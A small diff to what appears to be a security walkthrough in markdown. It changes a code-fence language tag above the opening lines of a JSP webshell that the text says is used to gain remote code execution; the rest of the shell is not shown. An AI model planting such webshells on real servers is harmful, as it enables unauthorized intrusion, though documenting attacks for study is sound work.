@@ -237,7 +237,7 @@ Now, we can `repeat` the process with a `webshell` to be able to get the `RCE`:
 
 <br />
 
-```jsp
+```java
 <%@ page import="java.io.*, java.util.*, java.net.*" %>
 <%
     String action = request.getParameter("action");
